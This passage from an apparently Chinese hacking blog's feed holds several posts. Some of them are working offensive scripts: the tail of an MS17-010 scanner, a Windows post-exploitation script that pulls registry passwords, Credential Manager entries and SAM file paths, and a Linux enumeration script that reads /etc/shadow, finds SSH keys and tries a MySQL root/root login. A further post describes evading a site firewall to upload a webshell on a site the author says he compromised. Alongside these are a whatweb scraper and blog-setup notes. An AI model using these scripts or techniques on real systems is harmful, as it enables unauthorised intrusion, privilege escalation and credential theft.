request&apos;.format(host))s.send(payload1)session_setup_response=s.recv(1024)user_id=session_setup_response[32:34]print(host,&apos;User ID=%s&apos;%struct.unpack(&apos;&lt;H&apos;,user_id)[0])modified_tree_connect_request=list(payload2)modified_tree_connect_request[32]=user_id[0]modified_tree_connect_request[33]=user_id[1]modified_tree_connect_request=&quot;&quot;.join(&apos;%s&apos;%ld for ld in modified_tree_connect_request)print(&apos;[+]{}Send connection&apos;.format(host))s.send(payload2)tree_connect_response=s.recv(1024)tree_id=tree_connect_response[28:30]print(&apos;[+]{}&apos;.format(host),&apos;Tree ID=%s&apos;%struct.unpack(&apos;&lt;H&apos;,tree_id)[0])modified_trans2_session_setup=list(payload3)modified_trans2_session_setup[28]=tree_id[0]modified_trans2_session_setup[29]=tree_id[1]modified_trans2_session_setup[32]=user_id[0]modified_trans2_session_setup[33]=user_id[1]modified_trans2_session_setup=&quot;&quot;.join(&apos;{}&apos;.format(li for li in modified_trans2_session_setup))print(&apos;[+]{}Sending success is actually returning.&apos;.format(host))s.send(payload3)final_respone=s.recv(1024)s.close()if final_respone[32]==&quot;\x51&quot;:    print(&apos;[*]existence MS17-010&apos;)else:    print(&apos;[-]Not existence MS17-010&apos;)def run():    scan()run()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/UuZtBJw.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows提权辅助脚本</title>
      <link href="/posts/d121753b.html"/>
      <url>/posts/d121753b.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>进入到后渗透阶段就涉及到了提权。提权的第一步是信息收集，所以这个脚本因此而诞生。当然Demon哥分享的干货是够干的</p><p><img src="https://i.imgur.com/VJFPdww.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>windows提权用到的命令：</p><pre><code>systeminfonet usernet user user1ipconfig /allroute printarp -Anetstat -anonetsh firewall show stateschtasks /query /fo LIST /vtasklist /SVCnet startDRIVERQUERYwmic qfe get Caption,Description,HotFixID,InstalledOnwmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;sc qc Spooler</code></pre><p>等等之类的</p><p>代码：</p><pre><code>import osdef collect():    xj=open(&apos;save.txt&apos;,&apos;w&apos;)    xj.close()    print(&apos;[+]什么是操作系统和架构？它缺少任何补丁吗？&apos;)    systeminfo=os.popen(&apos;systeminfo&apos;)    wmic_qfe=os.popen(&apos;wmic qfe&apos;)    for s in systeminfo:        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for c in wmic_qfe:        print(c,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]环境变量有什么有趣的吗？域控制器在LOGONSERVER？&apos;)    set=os.popen(&apos;set&apos;)    #Get_chiditem=os.popen(&apos;Get-ChildItem Env: | ft Key,Value&apos;)    for e in set:        print(e,file=open(&apos;save.txt&apos;,&apos;a&apos;))    #for t in Get_chiditem:        #print(t,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他连接的驱动器吗？&apos;)    net_use=os.popen(&apos;net use&apos;)    wmic_log=os.popen(&apos;wmic logicaldisk get caption,description,providername&apos;)    #psd=os.popen(&apos;Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root&apos;)    for ne in net_use:        print(ne,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for g in wmic_log:        print(g,file=open(&apos;save.txt&apos;,&apos;a&apos;))    #for d in psd:        #print(d,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]你是谁？&apos;)    whoami=os.popen(&apos;whoami&apos;)    username=os.popen(&apos;echo %USERNAME%&apos;)    for whoa in whoami:        print(whoa,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for m in username:        print(m,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]任何有趣的用户权限？注意：“状态”列并不表示用户具有或无权访问此权限。如果列出了该权限，则该用户拥有该权限。&apos;)    priv=os.popen(&apos;whoami /priv&apos;)    for i in priv:        print(i,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]用户在系统上有什么用途？任何未清理的旧用户配置文件？&apos;)    ur=os.popen(&apos;net users&apos;)    bw=os.popen(&apos;dir /b /ad &quot;C:/Users/&quot;&apos;)    #bs=os.popen(&apos;dir /b /ad &quot;C:/Documents and Settings/&quot; # Windows XP and below&apos;)    for r in ur:        print(r,file=open(&apos;save.txt&apos;,&apos;a&apos;))        for w in bw:            print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))            #for s in bs:                #print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他人登录吗？&apos;)    qwinsta=os.popen(&apos;qwinsta&apos;)    for w in qwinsta:        print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]系统上有哪些组？&apos;)    net_localgroup=os.popen(&apos;net localgroup&apos;)    for group in net_localgroup:        print(group,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]Administrators组中是否有任何用户？&apos;)    net_localgroup_Administrators=os.popen(&apos;net localgroup Administrators&apos;)    for administrator in net_localgroup_Administrators:        print(administrator,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]用户自动登录注册表中的任何内容？&apos;)    reg_query=os.popen(&apos;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;&apos;)    for v in reg_query:        print(v,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]在Credential Manager中有什么有趣的东西吗？&apos;)    cmdkey_list=os.popen(&apos;cmdkey /list&apos;)    for l in cmdkey_list:        print(l,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]cmdkey /list我们可以访问SAM和SYSTEM文件吗？&apos;)    lg=[&apos;%SYSTEMROOT%/repair/SAM&apos;,&apos;%SYSTEMROOT%/System32/config/RegBack/SAM&apos;,&apos;%SYSTEMROOT%/System32/config/SAM&apos;,&apos;%SYSTEMROOT%/repair/system&apos;,&apos;%SYSTEMROOT%/System32/config/SYSTEM&apos;,&apos;%SYSTEMROOT%/System32/config/RegBack/system&apos;]    for k in lg:        system=os.popen(k)        for q in system:            print(q,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]安装了什么软件？&apos;)    rj=[&apos;dir /a &quot;C:\Program Files&quot;&apos;,&apos;dir /a &quot;C:\Program Files (x86)&quot;&apos;,&apos;reg query HKEY_LOCAL_MACHINE\SOFTWARE&apos;]    for j in rj:        qw=os.popen(j)        for w in qw:            print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]程序文件夹中每个人或用户的完全权限？&apos;)    icacls=[&apos;icacls &quot;C:\Program Files\*&quot; 2&gt;nul&apos;,&apos;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul&apos;,&apos;icacls &quot;C:\Program Files\*&quot; 2&gt;nul &apos;,&apos;icacls &quot;C:\Program Files (x86)\*&quot;&apos;]    for aw in icacls:        qdw=os.popen(aw)        for rs in qdw:            print(rs,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]系统上正在运行的进程/服务是什么？内部服务没有暴露吗？如果是这样，我们可以打开它吗？&apos;)    tasklist=[&apos;tasklist /svc&apos;,&apos;tasklist /v&apos;,&apos;net start&apos;,&apos;sc query&apos;,]    for t in tasklist:        wx=os.popen(t)        for p in wx:            print(p,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]有没有不带引号的服务路径？&apos;)    wmcs=os.popen(&apos;wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;&apos;)    for m in wmcs:        print(m,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]那里有什么预定的任务？什么定制实施？&apos;)    xw=os.popen(&apos;schtasks /query /fo LIST 2&gt;nul | findstr TaskName&apos;)    print(xw,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]启动时跑了什么？&apos;)    qz=[&apos;wmic startup get caption,command&apos;,&apos;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run&apos;,&apos;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&apos;,&apos;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run&apos;,&apos;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&apos;,&apos;dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;&apos;,&apos;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;&apos;]    for z in qz:        xq=os.popen(z)        for r in xq:            print(r,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]连接了哪些NIC？有多个网络吗？&apos;)    ipconfig_all=os.popen(&apos;ipconfig /all&apos;)    for all in ipconfig_all:        print(all,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]我们有什么路线？&apos;)    xpo=os.popen(&apos;route print&apos;)    for o in xpo:        print(o,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]ARP缓存中的任何内容？&apos;)    arp=os.popen(&apos;arp -a&apos;)    for p in arp:        print(p,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]是否有与其他主机的连接？&apos;)    sw=os.popen(&apos;netstat -ano&apos;)    for b in sw:        print(b,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]防火墙是否已打开？如果是这样配置的是什么？&apos;)    fq=[&apos;netsh firewall show state&apos;,&apos;netsh firewall show config&apos;,&apos;netsh advfirewall firewall show rule name=all&apos;,&apos;netsh advfirewall export &quot;firewall.txt&quot;&apos;]    for u in fq:        fhq=os.popen(u)        for f in fhq:            print(f,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他有趣的界面配置吗？&apos;)    netsh_dump=os.popen(&apos;netsh dump&apos;)    for ump in netsh_dump:        print(ump,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]注册表中的任何密码？&apos;)    lv=[&apos;reg query HKCU /f password /t REG_SZ /s&apos;,&apos;reg query HKLM /f password /t REG_SZ /s &apos;]    for pasw in lv:        passwd=os.popen(pasw)        for pd in passwd:            print(pd,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]是否有可用的sysprep或无人值守文件？&apos;)    zi=os.popen(&apos;dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul&apos;)    for nb in zi:        print(nb,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]有待观察的有趣文件吗？可能在用户目录（桌面，文档等）中？&apos;)    sl=os.popen(&apos;dir /s *pass* == *vnc* == *.config* 2&gt;nul&apos;)    for lw in sl:        print(lw,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;&apos;)    print(&apos;&apos;)    print(&apos;[*]判断是否存在以下路径&apos;)    lss=[]    if os.path.exists(&apos;list.txt&apos;):        print(&apos;[+]存在list.txt&apos;)    else:        print(&apos;[-]不存在list.txt&apos;)        exit()    dk=open(&apos;list.txt&apos;,&apos;r&apos;)    for r in dk.readlines():        qk=&quot;&quot;.join(r.split(&apos;\n&apos;))        lss.append(qk)    for g in lss:        if os.path.exists(g):            print(&apos;[+]存在 {}&apos;.format(g))        else:            print(&apos;[-]不存在{}&apos;.format(g))collect()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/tpS2Tob.png" alt=""></p><p><img src="https://i.imgur.com/3KobSkD.png" alt=""></p><p>收集到的信息会写入save.txt<br>save.txt的结果：<a href="https://paste.ubuntu.com/p/dR5QGJBHY2/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/dR5QGJBHY2/</a></p><p>关于提权的两篇文章：</p><pre><code>http://www.fuzzysecurity.com/tutorials/16.htmlhttps://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</code></pre><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫抓取whatweb接口</title>
      <link href="/posts/6aba04f9.html"/>
      <url>/posts/6aba04f9.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前一直想抓whatweb的接口。但是明明写的没有毛病，就是抓不了今天不死心的在写了一次。发现了问题的所在</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=453413076,2870052388&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>什么是whatweb？</strong></p><pre><code>什么是WhatWeb？WhatWeb识别网站。它的目标是回答“这是什么网站？”的问题。WhatWeb可识别Web技术，包括内容管理系统（CMS），博客平台，统计/分析包，JavaScript库，Web服务器和嵌入式设备。WhatWeb拥有超过1700个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。WhatWeb可以隐秘，快速，或彻底但缓慢。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当您在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“隐身”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。开发了更积极的模式用于渗透测试。大多数WhatWeb插件都是彻底的，并且可以识别从微妙到显而易见的一系列线索。例如，大多数WordPress网站可以通过元HTML标签识别，例如&apos;&apos;，但少数WordPress网站删除了这个识别标签，但这并不妨碍WhatWeb。WordPress WhatWeb插件有超过15个测试，包括检查favicon，默认安装文件，登录页面，以及检查相对链接中的“/ wp-content /”。</code></pre><p><strong>whatweb在线检测地址：</strong><br><a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a></p><p>基本操作抓包：<br><img src="https://i.imgur.com/HVLhIyA.png" alt=""></p><p>从图中可以看见请求参数为<strong>target</strong><br>然后正常的写一个headers，然后用requests进行post请求应该就是这样吧= =很遗憾的是，这样子什么也不会返回。后来我看了一下<strong>控制台</strong>才发现原因。</p><p><img src="https://i.imgur.com/Q7prpQN.png" alt=""></p><p>图中的意思是，没有<strong>Console</strong>和<strong>Content-length</strong>头拒绝进行识别，后面抱着半信半疑的进行了测试发现居然可以了<br>代码：</p><pre><code>#-*-coding:&apos;utf-8&apos;-*-#name:九世#time:2018-8-8-20:58import requestsfrom bs4 import BeautifulSoupdef whatweb():    banner=&apos;&apos;&apos; ____  __.__.__  .__                |    |/ _|__|  | |  |  __ _______   |      &lt; |  |  | |  | |  |  \__  \  |    |  \|  |  |_|  |_|  |  // __ \_|____|__ \__|____/____/____/(____  /        \/                       \/ &apos;&apos;&apos;    print(banner)    user=input(&apos;Domain name to be querying:&apos;)    headers={&apos;user-agent&apos;:&apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&apos;,             &apos;Content-length&apos;:&apos;20&apos;,             &apos;Connection&apos;:&apos;keep-alive&apos;}    data={&apos;target&apos;: &apos;{}&apos;.format(user)}    url=&apos;https://www.whatweb.net/&apos;    reqts=requests.post(url=url,headers=headers,data=data)    dw=BeautifulSoup(reqts.text,&apos;html.parser&apos;)    for p in dw.find_all(&apos;pre&apos;):        print(p.get_text())def jy2():    banner = &apos;&apos;&apos; ____  __.__.__  .__                    |    |/ _|__|  | |  |  __ _______       |      &lt; |  |  | |  | |  |  \__  \      |    |  \|  |  |_|  |_|  |  // __ \_    |____|__ \__|____/____/____/(____  /            \/                       \/ &apos;&apos;&apos;    print(banner)    user = input(&apos;file:&apos;)    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        headers = {            &apos;user-agent&apos;: &apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&apos;,            &apos;Content-length&apos;: &apos;20&apos;,            &apos;Connection&apos;: &apos;keep-alive&apos;}        data = {&apos;target&apos;: &apos;{}&apos;.format(qc)}        url = &apos;https://www.whatweb.net/&apos;        reqts = requests.post(url=url, headers=headers, data=data)        dw = BeautifulSoup(reqts.text, &apos;html.parser&apos;)        for p in dw.find_all(&apos;pre&apos;):            print(p.get_text())print(&apos;[1] 单个域名&apos;)print(&apos;[2] 批量导入&apos;)xw=input(&apos;xz=&gt;:&apos;)if xw==&apos;1&apos;:    whatweb()elif xw==&apos;2&apos;:    jy2()</code></pre><p>两个功能，一个单检测，一个批量导入进行检测。<br>测试图如下：</p><p><img src="https://i.imgur.com/xZyzBvT.png" alt=""></p><p><img src="https://i.imgur.com/pDIc0Yl.png" alt=""></p><p>转载请声明：来自422926799.github.com</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过网站防火墙上传</title>
      <link href="/posts/c2257cfb.html"/>
      <url>/posts/c2257cfb.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前几天在搞站的时候，拿到了一个webshell。一开始还没有网站防火墙之类的东西，好像是一句话被管理员发现了。安了防火墙和360…360是恶心的一批的东西。</p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>其实方法很简单，注意看图，这是一开始普通上传没有做任何修改的<br>会被直接拦截<br><img src="https://i.imgur.com/L8tVoiA.png" alt=""></p><p>把图中所画的空格去掉，就能产生BUG导致上传成功。<br><img src="https://i.imgur.com/vpOPLpA.png" alt=""></p><p>上传成功<br><img src="https://i.imgur.com/tqNBsFZ.png" alt=""></p><p><img src="https://i.imgur.com/7pJXcKj.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一波三折的博客环境重新搭建</title>
      <link href="/posts/26807c00.html"/>
      <url>/posts/26807c00.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天该死的Ubuntu崩了。。。然后博客环境也没有了。W_W，百度各种办法发现无法恢复。后面干脆重新建一个，反正文章有备份。以后一定备份博客。。。喵了个咪的。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1325385962,3551867219&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先把仓库删除，安装Git，nodejs。然后在安装hexo</p><pre><code>git下载地址：https://git-scm.com/nodejs下载地址：https://nodejs.org/en/下载好后，各自安装</code></pre><p>在x盘创建一个目录，名为mylogo。然后进入其目录执行</p><pre><code>npm install -g hexonpm install hexo-deployer-git --save</code></pre><p>然后下载Cactus主题，进行替换更改。在进行创建新的分类</p><pre><code>hexo new page Writing</code></pre><p>修改_config.yml改名字等等之类的东西。在添加cactus的站内搜索功能</p><pre><code>hexo new page Searchnpm install hexo-generator-search --save进入source/Search目录，修改index.md,添加Search: true</code></pre><p>在将备份的文章放入source/_posts,在git bash创建ssh，然后将其放入github。执行hexo -d。执行之后发现</p><pre><code>ERROR Deployer not found: .git</code></pre><p>安装hexo-depoyer-git，将git添加其环境变量。进行电脑重启，执行git init,然后在执行hexo -d,在次执行hexo -d 发现一个警告为IP永久添加RSA秘钥之类的。打开host文件添加 </p><pre><code>“自己的IP” github.com</code></pre><p>之后在次执行发现</p><pre><code>warning: LF will be replaced by CRLF in xxxx</code></pre><p>解决方法：</p><pre><code>git config --global core.autocrlf false</code></pre><p>再次执行hexo -d，发现没有毛病了。再次，成功的把博客搭建好了。。。<br>这次没加2D模型。有人说太宅男了。</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux信息收集</title>
      <link href="/posts/8e06ab6b.html"/>
      <url>/posts/8e06ab6b.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。<br>很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张）<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路</strong>：</p><pre><code>0.首先要获取系统信息：系统名称本地ip主机名本地dns环境变量shell程序hosts文件路由信息arp缓存计划任务挂载磁盘mail目录history文件home/root/bin/sbin目录1.获取用户信息当前权限用户信息本地用户在线用户hash加密规则hash信息用户组信息最后登录信息最后登录用户信息所有用户的计划任务2.安全扫描是否能无密码sudoconf配置文件ssh的密钥文件是否能root登录敏感配置文件扫描关键字含有config、web.xml、database、pass的文件uid为0用户敏感服务匿名空密码用户zip/tar.gz/sh/pl/py/rb/txt/bak后缀文件3.全部命令放入一个列表里，说明放入一个列表里4.遍历写入</code></pre><p>代码：</p><pre><code>import osml=[&apos;uname -a&apos;,&apos;cat /etc/issue&apos;,&apos;hostname&apos;,&apos;cat /etc/hosts&apos;,&apos;who&apos;,&quot;awk -F &apos;:&apos; &apos;{print $1,$3,$4,$6;}&apos; /etc/passwd&quot;,&apos;cat /etc/group&apos;,&apos;cat /etc/shadow&apos;,&apos;grep -v -E &quot;^#&quot; /etc/passwd&apos;,&apos;cat ~/.bash_history&apos;,&apos;w&apos;,&apos;netstat&apos;,&apos;ps -aux&apos;,&apos;dpkg -l&apos;,&apos;netstat -antpu&apos;,&apos;arp -a&apos;,&apos;uname -a 2&gt;/dev/null&apos;,&apos;hostname&apos;,&apos;lastlog&apos;,&apos;for i in $(cat /etc/passwd 2&gt;/dev/null&apos;,&quot;grep -v &apos;^[^:]*:[x]&apos; /etc/passwd 2&gt;/dev/null&quot;,&apos;grep -v &quot;^#&quot; /etc/passwd&apos;,&apos;cat /etc/shadow 2&gt;/dev/null&apos;,&apos;cat /etc/master.passwd 2&gt;/dev/null&apos;,&apos;echo &apos;&apos;sudo -S -l 2&gt;/dev/null&apos;,&apos;ls -ahl /root/ 2&gt;/dev/null&apos;,&apos;ls -ahl /home/ 2&gt;/dev/null&apos;,&apos;find / -writable -not -user \`whoami\` -type f -not -path &quot;/proc/*&quot; -exec ls -al {} \; 2&gt;/dev/null&apos;,&apos;find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls&apos;,&apos;&apos;&apos;grep &quot;PermitRootLogin &quot; /etc/ssh/sshd_config 2&gt;/dev/null | grep -v &quot;#&quot; | awk &apos;{print  $2}&apos;&apos;&apos;,&apos;echo $PATH 2&gt;/dev/null&apos;,&apos;cat /etc/shells 2&gt;/dev/null&apos;,&apos;cat /etc/login.defs 2&gt;/dev/null | grep &quot;PASS_MAX_DAYS\|PASS_MIN_DAYS\|PASS_WARN_AGE\|ENCRYPT_METHOD&quot; 2&gt;/dev/null | grep -v &quot;#&quot; 2&gt;/dev/null&apos;,&apos;ls -la /etc/cron* 2&gt;/dev/null&apos;,&apos;cat /etc/crontab 2&gt;/dev/null&apos;,&apos;cat /etc/passwd | cut -d &quot;:&quot; -f 1 | xargs -n1 crontab -l -u 2&gt;/dev/null&apos;,&apos;cat /etc/resolv.conf 2&gt;/dev/null&quot;&apos;,&apos;route 2&gt;/dev/null&apos;,&apos;netstat -antp 2&gt;/dev/null&apos;,&apos;netstat -anup 2&gt;/dev/null&apos;,&apos;ps aux 2&gt;/dev/null&apos;,&quot;ps aux&quot;,&quot;&apos;ls -la /etc/init.d 2&gt;/dev/null&apos;&quot;,&quot;find /etc/init.d/ \! -uid 0 -type f 2&gt;/dev/null&quot;,&quot;mysql --version 2&gt;/dev/null&quot;,&quot;sudo -V 2&gt;/dev/null&quot;,&quot;mysqladmin -uroot -proot version 2&gt;/dev/null&quot;,&quot;psql -V 2&gt;/dev/null&quot;,&quot;apache2 -v 2&gt;/dev/null; httpd -v 2&gt;/dev/null&quot;,&quot;&quot;&quot;awk &apos;{sub(/.*\export /,&quot;&quot;)}1&quot;&quot;&quot;,&apos;ifconfig&apos;]shuomin=[&apos;内核(是否为x64还是x86)&apos;,&apos;版本&apos;,&apos;主机名&apos;,&apos;hosts&apos;,&apos;目前登录系统的用户信息&apos;,&apos;获取用户名&apos;,&apos;获取用户组&apos;,&apos;获取hash&apos;,&apos;列出超级用户&apos;,&apos;查看用户操作&apos;,&apos;获取在线用户&apos;,&apos;端口&apos;,&apos;进程&apos;,&apos;程序&apos;,&apos;敏感文件&apos;,&apos;交互通信的ip&apos;,&apos;arp缓存&apos;,&apos;基础内核信息&apos;,&apos;主机名&apos;,&apos;最后用户登录的信息&apos;,&apos;列出所有用户的组&apos;,&apos;查询是否有hash存储在/etc/passwd(*nix中)&apos;,&apos;根据uid列出本地用户&apos;,&apos;读取shadow文件&apos;,&apos;bsd的shadow文件&apos;,&apos;能够sudo不需要提供密码&apos;,&apos;检查root目录是否存在&apos;,&apos;显示home目录情况&apos;,&apos;寻找文件我们能写但是不属于我们的文件&apos;,&apos;寻找ssh公钥&apos;,&apos;root是否能登录ssh,如果返回yes则可以登录&apos;,&apos;环境变量&apos;,&apos;列出能用的shells&apos;,&apos;hash的密码加密政策&apos;,&apos;所有的计划任务配置文件&apos;,&apos;获取计划任务内容&apos;,&apos;获取每个用户的计划任务&apos;,&apos;dns设置&apos;,&apos;路由配置&apos;,&apos;正在监听的tcp端口&apos;,&apos;udp端口&apos;,&apos;正在运行的程序&apos;,&apos;查看进程路径和权限&apos;,&apos;获取inetd.conf文件(监视网络的守护进程)&apos;,&apos;列举各种服务的管理脚本&apos;,&apos;寻找不是root的&apos;,&apos;获取mysql版本&apos;,&apos;获取sudo版本&apos;,&apos;测试root/root能否登录&apos;,&apos;postgres版本&apos;,&apos;apache详情&apos;,&apos;apache的运行用户&apos;,&apos;ip&apos;]def poc():    xk = open(&apos;save.txt&apos;, &apos;w&apos;)    xk.close()    for i in range(0,len(ml)):        zx=os.popen(ml[i])        print(&apos;[+]{}&apos;.format(shuomin[i]))        print(&apos;[+]{}&apos;.format(shuomin[i]),file=open(&apos;save.txt&apos;,&apos;a&apos;))        for z in zx:            print(z,file=open(&apos;save.txt&apos;,&apos;a&apos;))poc()</code></pre><p>收集结果如下：<br><img src="https://i.imgur.com/F4QC5Cs.png" alt=""></p><p><img src="https://i.imgur.com/ap7NSAR.png" alt=""></p><p><img src="https://i.imgur.com/rNcTlqi.png" 